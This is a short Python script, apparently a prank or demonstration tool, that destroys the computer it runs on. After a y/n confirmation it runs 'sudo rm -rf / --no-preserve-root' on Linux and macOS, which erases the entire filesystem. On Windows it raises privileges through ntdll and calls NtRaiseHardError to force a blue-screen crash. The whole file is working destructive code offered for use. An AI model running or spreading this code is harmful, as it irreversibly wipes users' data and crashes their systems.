def bsod_linux():
  import os
  os.system('sudo rm -rf / --no-preserve-root')

def bsod_win():
  import ctypes
  ntdll = ctypes.windll.ntdll
  prev_value = ctypes.c_bool()
  res = ctypes.c_ulong()
  ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
  if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
      print("BSOD Successfull!")
  else:
      print("BSOD Failed...")

def main():
  import platform
  plt = platform.system()
  print('Your platform', plt)
  if input('This will kill your system. Are you sure?(y/n)').strip() != 'y':
    print('Break.')
    return
  if plt in ('Linux', 'Darwin'):
    bsod_linux()
  elif plt in ('Windows'):
    bsod_win()
  else:
    raise ValueError(f'Platform {plt!r} not found.')

if __name__ == '__main__':
  main()
